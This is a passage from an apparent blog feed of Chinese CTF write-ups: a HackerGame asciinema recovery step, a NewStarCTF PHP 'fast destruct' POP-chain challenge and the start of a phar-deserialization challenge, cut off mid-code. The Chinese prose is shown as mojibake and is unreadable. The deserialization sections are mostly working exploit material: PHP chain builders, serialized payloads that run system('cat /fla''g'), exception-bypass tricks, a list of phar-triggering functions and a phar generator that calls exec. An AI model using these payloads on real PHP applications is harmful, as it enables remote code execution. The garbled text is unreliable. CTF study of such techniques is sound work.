çš„æ—¶å€™ï¼Œä½¿ç”¨ asciinema å½•åˆ¶çš„æ–‡ä»¶äº†ï¼Œä½ èƒ½ä»ä¸­è¿˜åŸå‡ºä»£ç å—ï¼Ÿ</p><p>å¤§æ¦‚å°±æ˜¯è¿˜åŸ asciinema å½•åˆ¶æ–‡ä»¶ï¼Œç„¶åå°±è·‘è¿˜åŸå‡ºæ¥çš„ä»£ç ï¼Œ<br>è¿™é‡Œç”¨å‘½ä»¤ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asciinema cat asciinema_restore.rec &gt; output.txt</span><br></pre></td></tr></table></figure><p>è·‘å‡ºæ¥ä¹‹åå‘ç°å¾ˆå¤šå¹²æ‰°ï¼Œæ‰€ä»¥ç”¨ sed è¿‡æ»¤ä¸€ä¸‹ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asciinema cat asciinema_restore.rec | sed &#x27;s/\x1b\[[<span class="number">0</span>-<span class="number">9</span>;]*[a-zA-Z]//g&#x27; | sed &#x27;s/\x1b.//g&#x27; | tr -d &#x27;\b&#x27; &gt; output.txt</span><br></pre></td></tr></table></figure><p>è·‘å‡ºæ¥åå‘ç°è¿˜æ˜¯æœ‰éƒ¨åˆ†æ²¡å»æ‰çš„ï¼Œå°±äººå·¥å»äº†ï¼Œå¤§æ¦‚å°±æ˜¯ find ç„¶åæ›¿æ¢è¿™æ ·å­ï¼Œè¿˜åŸå‡ºä»£ç åè·‘è¿™ä¸ªä»£ç å°±èƒ½è·å¾—åˆ° flag äº†ï¼š</p><p><img src="/2023/11/04/HackerGame2023/13.png"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>WP å°±å†™åˆ°è¿™é‡Œäº†ï¼Œä¹‹åä¼šå¥½å¥½ç ”ç©¶æ¯ä¸€é“é¢˜ï¼Œä¹‹åçš„é¢˜è§£ä¼šå•ç‹¬æ”¾å‡ºæ¥ï¼Œè¿™é‡Œå°±æŠŠæˆ‘å†™å‡ºæ¥çš„é¢˜åšä¸€ä¸ªæ€»ç»“ã€‚è¿™æ¬¡ HackerGame å¾ˆæœ‰æ„æ€ï¼ŒæœŸå¾…æ˜å¹´çš„ï¼</p>]]></content>
      
      
      <categories>
          
          <category> HackerGame </category>
          
          <category> 2023 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¤¾å·¥ </tag>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> docker </tag>
            
            <tag> git </tag>
            
            <tag> HTTP </tag>
            
            <tag> Web ç¼–ç¨‹ </tag>
            
            <tag> asciinema </tag>
            
            <tag> json </tag>
            
            <tag> yaml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€newstarctf2023ã€‘Fast Destruct</title>
      <link href="/2023/10/31/newstarctf2023-fast-destruct/"/>
      <url>/2023/10/31/newstarctf2023-fast-destruct/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€newstarctfã€‘-More-Fast-pop-é“¾æ„é€ "><a href="#ã€newstarctfã€‘-More-Fast-pop-é“¾æ„é€ " class="headerlink" title="ã€newstarctfã€‘ More Fast pop é“¾æ„é€ "></a>ã€newstarctfã€‘ More Fast pop é“¾æ„é€ </h1><h2 id="é¢˜ç›®æºç "><a href="#é¢˜ç›®æºç " class="headerlink" title="é¢˜ç›®æºç "></a>é¢˜ç›®æºç </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br></pre></td></tr></table></figure><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>çœ‹åˆ°é¢˜ç›®ï¼Œåœ¨ Web è¿™ä¸ªç±»é‡Œé¢æ‰èƒ½ RCEï¼Œä¹Ÿå°±æ˜¯è¯´æœ€åçš„ POP<br> é“¾è¦åœ¨ Web ç»“æŸï¼Œå¾€å‰æ¨å‘ç° Pwn ç±»é‡Œæœ‰ evil è¯´æ˜æ˜¯ç”± Pwn ç±»åˆ° Web ç±»ã€‚</p><p> è§¦å‘ Pwn ç±»çš„__invoke()éœ€è¦å°† Pwn ç±»ä½œä¸ºå‡½æ•°è°ƒç”¨ï¼Œå¯ä»¥çœ‹åˆ°Reverseç±»æ»¡è¶³è¦æ±‚ï¼Œæ‰€ä»¥æ˜¯ Reverse ç±»åˆ° Pwn ç±»ã€‚</p><p> Reverseç±»çš„ __get()æ–¹æ³•éœ€è¦è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§ï¼Œå¯ä»¥çœ‹åˆ°Cryptoç±»æ»¡è¶³æ¡ä»¶ï¼Œæ‰€ä»¥æ˜¯Cryptoç±»åˆ° Reverse ç±»ã€‚</p><p> Crypto ç±»çš„__toString()åœ¨Startç±»çš„ die å‡½æ•°ä¸­å¯ä»¥è§¦å‘ï¼Œè¯´æ˜æ˜¯ Start ç±»åˆ° Crypto ç±»ã€‚</p><p> æ‰€ä»¥è¿™é“é¢˜çš„ POP é“¾æ„é€ ä¸ºï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start::__destruct -&gt; Crypto::__toString -&gt; Reverse::__get -&gt; Pwn::__invoke -&gt; Web::evil</span><br></pre></td></tr></table></figure><p>POPé“¾æ„é€ å¾ˆå®¹æ˜“ï¼Œæ„é€  POP é“¾çš„ä»£ç ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;errMsg = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&quot;fla&#x27;&#x27;g&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸»è¦æ˜¯å¦‚ä½•å°† Start ç±»çš„ __destruct ä½œä¸ºå…¥å£è§¦å‘ã€‚è¿™é‡Œè¦ä»‹ç»ä¸€ä¸‹ fast destruct æŠ€æœ¯ï¼š</p><ul><li>åœ¨ php ä¸­ï¼Œå¦‚æœå•ç‹¬æ‰§è¡Œ unserialize å‡½æ•°è¿›è¡Œååºåˆ—åŒ–ï¼Œé‚£ä¹ˆååºåˆ—åŒ–åçš„å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå°±ä¼šä»…é™äº unserialize å‡½æ•°æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œunserializeå‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿™ä¸ªç±»å°±é”€æ¯äº†ï¼Œæ­¤æ—¶å°±ä¼šè°ƒç”¨ destructã€‚</li><li>å¦‚æœå°† unserialize ååºåˆ—åŒ–åçš„å¯¹è±¡èµ‹å€¼ç»™å¦ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¯¥å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå°±ä¼šå»¶é•¿è‡³è¯¥å˜é‡é”€æ¯ä¸ºæ­¢ã€‚</li><li>unserialize è¿‡ç¨‹ä¸­æ˜¯é€å­—è¯»å–çš„ï¼Œä»–ä¼šå…ˆæŠŠè¯»å–åˆ°çš„å†…å®¹åˆ†é…å†…å­˜ç©ºé—´ï¼Œåœ¨ç»“æŸçš„æ—¶å€™ç»Ÿä¸€è°ƒç”¨ã€‚</li></ul><p>ä»¥ä¸Šä¸‰æ¡æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ååºåˆ—åŒ–å­—ç¬¦ä¸²çš„ç»“æ„ï¼Œå½“ unserialize è¯»åˆ°ä¸æ­£ç¡®çš„ç»“æ„æ—¶ä¼šç›´æ¥å¼ºåˆ¶é€€å‡ºï¼Œè¿™æ—¶ unserialize æ‰§è¡Œç»“æŸï¼Œç±»é”€æ¯ï¼Œä¼šè°ƒç”¨ destructï¼Œå¯¹äºå·²ç»åˆ†é…å¥½å†…å­˜ç©ºé—´çš„ç±»æ¥è¯´ï¼Œå°±æ˜¯æå‰è°ƒç”¨äº† destruct ã€‚</p><p>fast destructæœ‰ä¸¤ç§æ–¹æ³•ï¼š<br>åºåˆ—åŒ–å¥½åçš„ç»“æœä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><ol><li>ä¿®æ”¹åºåˆ—åŒ–æ•°å­—å…ƒç´ ä¸ªæ•°(O:5 -&gt; O:6)ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>å»æ‰åºåˆ—åŒ–å°¾éƒ¨ }:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸¤ç§æ–¹æ³•å‡å¯æ‹¿åˆ° flagï¼š</p><p><img src="/2023/10/31/newstarctf2023-fast-destruct/pop.jpg"></p><h2 id="å®˜æ–¹é¢˜è§£"><a href="#å®˜æ–¹é¢˜è§£" class="headerlink" title="å®˜æ–¹é¢˜è§£"></a>å®˜æ–¹é¢˜è§£</h2><p>å®˜æ–¹é¢˜è§£ç»™å‡ºäº†ä¸€ä¸ªåŸºäº GC åƒåœ¾å›æ”¶æœºåˆ¶çš„ç»•è¿‡ï¼ŒPHPä¸­ æœ‰åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œå½“è§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶æ—¶ï¼Œåˆ™ä¼šè‡ªåŠ¨è°ƒç”¨ destruct å‡½æ•°ï¼Œè§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶çš„æ–¹æ³•æœ‰ï¼š</p><ul><li>æºç ä¸­æœ‰ unset() å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥é”€æ¯å¯¹è±¡</li><li>å½“ç»™å¯¹è±¡èµ‹å€¼ä¸º NULL æ—¶ï¼Œå¯ä»¥è§¦å‘</li><li>å½“å¯¹è±¡å¤±å»å¼•ç”¨æ—¶ï¼Œå¯ä»¥è§¦å‘</li></ul><p>å®˜æ–¹çš„é¢˜è§£ä¸­ï¼Œé€šè¿‡ä¿®æ”¹ä¸‹æ ‡çš„æ–¹å¼ï¼Œè®©å·²ç»åˆ†é…å¥½å†…å­˜çš„å¯¹è±¡å¤±å»å¼•ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">0</span>] = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:0&quot;</span>,<span class="string">&quot;i:1&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:1;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fl&#x27;&#x27;ag&quot;;&#125;&#125;&#125;&#125;&#125;i:1;N;&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ i:1 åœ¨åé¢ä¼šå†æ¬¡å£°æ˜ï¼Œå‰é¢é‚£ä¸ªå¯¹è±¡å¤±å»å¼•ç”¨ï¼Œæ‰€ä»¥å°±å‡ºå‘äº† destructï¼Œè¿™ç§æ–¹å¼å¯ä»¥ç»•è¿‡æŠ›å‡ºå¼‚å¸¸ï¼Œåº”ç”¨èŒƒå›´æ›´å¹¿ä¸€äº›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> pop é“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€newstarctf2023ã€‘PharOne (DNS logå¤–å¸¦æ³•)</title>
      <link href="/2023/10/29/newstarctf2023-pharone/"/>
      <url>/2023/10/29/newstarctf2023-pharone/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€newstarctf2023ã€‘PharOne-DNS-logå¤–å¸¦æ³•"><a href="#ã€newstarctf2023ã€‘PharOne-DNS-logå¤–å¸¦æ³•" class="headerlink" title="ã€newstarctf2023ã€‘PharOne (DNS logå¤–å¸¦æ³•)"></a>ã€newstarctf2023ã€‘PharOne (DNS logå¤–å¸¦æ³•)</h1><h2 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h2><p>æ‰“å¼€é¶æœºï¼Œçœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶åå‘ç°å•¥shell æ‹¿ä¸åˆ°ï¼Œå˜æ¢æ€è·¯ï¼Œçœ‹æºç ä¸­æœ‰æ³¨é‡Šæç¤ºï¼šclass.phpï¼Œurl è¯·æ±‚ class.php å‘ç°ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™ä¸ªä»£ç ï¼Œå°±çŸ¥é“è¿™ä¸ªé¢˜è¦ç”¨ phar å»åšäº†ã€‚</p><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>ç•™æ„åˆ°äº† unlink è¿™ä¸ªæ–¹æ³•å’Œ flag è¿™ä¸ªç±»ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯å¯ä»¥è§¦å‘ phar çš„ååºåˆ—åŒ–çš„ï¼Œè¿™é‡Œåˆ—ä¸¾ä¸€ä¸‹å¯ä»¥è§¦å‘ pharååºåˆ—åŒ– çš„æ–¹æ³•ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fopen() unlink() stat() fstat() fseek() rename() opendir() rmdir() mkdir() </span><br><span class="line"></span><br><span class="line">file_put_contents() file_get_contents() </span><br><span class="line"></span><br><span class="line">file_exists() fileinode() include() </span><br><span class="line">require() include_once require_once() </span><br><span class="line"></span><br><span class="line">filemtime() fileowner() fileperms() </span><br><span class="line">filesize() is_dir() scandir() rmdir() </span><br><span class="line"></span><br><span class="line">highlight_file()</span><br><span class="line"></span><br><span class="line">è¿˜æœ‰ä¸€ä¸ªç±»ï¼š</span><br><span class="line">new DirectoryIteartor() </span><br></pre></td></tr></table></figure><p>åŸºæœ¬æ€è·¯å°±æ˜¯é€šè¿‡post ä¸Šä¼  phar æ–‡ä»¶ï¼Œç„¶åè§¦å‘ unlink ååºåˆ—åŒ–ï¼Œåœ¨ Flag ç±»ä¸­è§¦å‘exec($this-&gt;cmd); å®ç° RCEã€‚</p><p>phar æ–‡ä»¶çš„æ„æˆï¼š</p><p><img src="/2023/10/29/newstarctf2023-pharone/1.jpg"></p><p>åœ¨ phar æ–‡ä»¶ä¸­çš„.metadataä¸­å¯ä»¥å†™å…¥ php è¯­å¥ï¼Œå½“æ‰§è¡Œ phar:&#x2F;&#x2F;æ–‡ä»¶å å»è¯»å–è¯¥ phar æ–‡ä»¶æ—¶ï¼Œä¸Šè¿°è®²åˆ°çš„æ–¹æ³•å°±ä¼šæ£€æŸ¥.metadataæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±è§¦å‘ååºåˆ—åŒ–ã€‚</p><p>å…ˆå†™ä¸€æ®µ php ä»£ç ç”¨äºç”Ÿæˆ phar æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;sleep 5&quot;</span>; <span class="comment">#åˆ¤æ–­æ— å›æ˜¾æ˜¯å¦æˆåŠŸæ‰§è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">#è§¦å‘ unlink</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span 